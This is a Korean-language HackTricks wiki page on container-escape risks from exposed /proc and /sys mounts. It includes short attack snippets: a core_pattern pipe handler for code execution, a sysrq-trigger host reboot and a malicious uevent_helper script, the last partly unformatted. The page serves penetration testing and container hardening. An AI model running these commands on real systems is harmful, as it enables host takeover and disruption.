# 민감한 마운트

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**

</details>
{% endhint %}

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

`/proc` 및 `/sys`의 노출은 적절한 네임스페이스 격리 없이 상당한 보안 위험을 초래하며, 공격 표면을 확대하고 정보 유출을 포함합니다. 이러한 디렉토리는 민감한 파일을 포함하고 있으며, 잘못 구성되거나 무단 사용자가 접근할 경우 컨테이너 탈출, 호스트 수정 또는 추가 공격에 도움이 되는 정보를 제공할 수 있습니다. 예를 들어, `-v /proc:/host/proc`를 잘못 마운트하면 경로 기반 특성으로 인해 AppArmor 보호를 우회할 수 있으며, `/host/proc`가 보호되지 않게 됩니다.

**각 잠재적 취약점에 대한 추가 세부정보는** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**에서 확인할 수 있습니다.**

## procfs 취약점

### `/proc/sys`

이 디렉토리는 일반적으로 `sysctl(2)`를 통해 커널 변수를 수정할 수 있는 접근을 허용하며, 여러 개의 우려되는 하위 디렉토리를 포함합니다:

#### **`/proc/sys/kernel/core_pattern`**

* [core(5)](https://man7.org/linux/man-pages/man5/core.5.html)에서 설명됨.
* 코어 파일 생성 시 실행할 프로그램을 정의할 수 있으며, 첫 128 바이트가 인수로 사용됩니다. 파일이 파이프 `|`로 시작하면 코드 실행으로 이어질 수 있습니다.
*   **테스트 및 악용 예시**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # 쓰기 접근 테스트
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # 사용자 정의 핸들러 설정
sleep 5 && ./crash & # 핸들러 트리거
```

#### **`/proc/sys/kernel/modprobe`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 자세히 설명됨.
* 커널 모듈 로더의 경로를 포함하며, 커널 모듈을 로드하기 위해 호출됩니다.
*   **접근 확인 예시**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # modprobe 접근 확인
```

#### **`/proc/sys/vm/panic_on_oom`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 참조됨.
* OOM 조건이 발생할 때 커널이 패닉을 일으키거나 OOM 킬러를 호출할지를 제어하는 전역 플래그입니다.

#### **`/proc/sys/fs`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에 따라 파일 시스템에 대한 옵션 및 정보를 포함합니다.
* 쓰기 접근은 호스트에 대한 다양한 서비스 거부 공격을 가능하게 할 수 있습니다.

#### **`/proc/sys/fs/binfmt_misc`**

* 매직 넘버에 따라 비네이티브 바이너리 형식에 대한 인터프리터를 등록할 수 있습니다.
* `/proc/sys/fs/binfmt_misc/register`가 쓰기 가능할 경우 권한 상승 또는 루트 쉘 접근으로 이어질 수 있습니다.
* 관련된 악용 및 설명:
* [Poor man's rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* 심층 튜토리얼: [비디오 링크](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### `/proc`의 기타

#### **`/proc/config.gz`**

* `CONFIG_IKCONFIG_PROC`가 활성화된 경우 커널 구성을 노출할 수 있습니다.
* 공격자가 실행 중인 커널의 취약점을 식별하는 데 유용합니다.

#### **`/proc/sysrq-trigger`**

* Sysrq 명령을 호출할 수 있으며, 즉각적인 시스템 재부팅 또는 기타 중요한 작업을 유발할 수 있습니다.
*   **호스트 재부팅 예시**:

```bash
echo b > /proc/sysrq-trigger # 호스트 재부팅
```

#### **`/proc/kmsg`**

* 커널 링 버퍼 메시지를 노출합니다.
* 커널 악용, 주소 유출 및 민감한 시스템 정보를 제공하는 데 도움이 될 수 있습니다.

#### **`/proc/kallsyms`**

* 커널에서 내보낸 심볼과 그 주소를 나열합니다.
* KASLR을 극복하기 위한 커널 악용 개발에 필수적입니다.
* 주소 정보는 `kptr_restrict`가 `1` 또는 `2`로 설정된 경우 제한됩니다.
* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 세부정보 확인.

#### **`/proc/[pid]/mem`**

* 커널 메모리 장치 `/dev/mem`과 인터페이스합니다.
* 역사적으로 권한 상승 공격에 취약했습니다.
* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 더 많은 정보 확인.

#### **`/proc/kcore`**

* 시스템의 물리적 메모리를 ELF 코어 형식으로 나타냅니다.
* 읽기는 호스트 시스템 및 기타 컨테이너의 메모리 내용을 유출할 수 있습니다.
* 큰 파일 크기는 읽기 문제 또는 소프트웨어 충돌을 초래할 수 있습니다.
* [2019년 /proc/kcore 덤프하기](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)에서 자세한 사용법 확인.

#### **`/proc/kmem`**

* 커널 가상 메모리를 나타내는 `/dev/kmem`의 대체 인터페이스입니다.
* 읽기 및 쓰기를 허용하므로 커널 메모리를 직접 수정할 수 있습니다.

#### **`/proc/mem`**

* 물리적 메모리를 나타내는 `/dev/mem`의 대체 인터페이스입니다.
* 읽기 및 쓰기를 허용하며, 모든 메모리 수정을 위해서는 가상 주소를 물리적 주소로 변환해야 합니다.

#### **`/proc/sched_debug`**

* 프로세스 스케줄링 정보를 반환하며, PID 네임스페이스 보호를 우회합니다.
* 프로세스 이름, ID 및 cgroup 식별자를 노출합니다.

#### **`/proc/[pid]/mountinfo`**

* 프로세스의 마운트 네임스페이스에서 마운트 지점에 대한 정보를 제공합니다.
* 컨테이너 `rootfs` 또는 이미지의 위치를 노출합니다.

### `/sys` 취약점

#### **`/sys/kernel/uevent_helper`**

* 커널 장치 `uevent`를 처리하는 데 사용됩니다.
* `/sys/kernel/uevent_helper`에 쓰면 `uevent` 트리거 시 임의의 스크립트를 실행할 수 있습니다.
*   **악용 예시**: %%%bash

#### 페이로드 생성

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### 컨테이너의 OverlayFS 마운트에서 호스트 경로 찾기

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### 악성 헬퍼로 uevent\_helper 설정

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

#### uevent 트리거

echo change > /sys/class/mem/null/uevent

#### 출력 읽기

cat /output %%%

#### **`/sys/class/thermal`**

* 온도 설정을 제어하며, 서비스 거부 공격이나 물리적 손상을 초래할 수 있습니다.

#### **`/sys/kernel/vmcoreinfo`**

* 커널 주소를 유출하여 KASLR을 손상시킬 수 있습니다.

#### **`/sys/kernel/security`**

* Linux 보안 모듈(AppArmor 등)의 구성을 허용하는 `securityfs` 인터페이스를 포함합니다.
* 접근이 가능하면 컨테이너가 자신의 MAC 시스템을 비활성화할 수 있습니다.

#### **`/sys/firmware/efi/vars` 및 `/sys/firmware/efi/efivars`**

* NVRAM에서 EFI 변수를 상호작용하기 위한 인터페이스를 노출합니다.
* 잘못된 구성이나 악용은 브릭된 노트북이나 부팅할 수 없는 호스트 머신으로 이어질 수 있습니다.

#### **`/sys/kernel/debug`**

* `debugfs`는 커널에 대한 "규칙 없음" 디버깅 인터페이스를 제공합니다.
* 제한 없는 특성으로 인해 보안 문제의 이력이 있습니다.

### 참고 문헌

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [리눅스 컨테이너 이해 및 강화](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [특권 및 비특권 리눅스 컨테이너 악용](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**

</details>
{% endhint %}
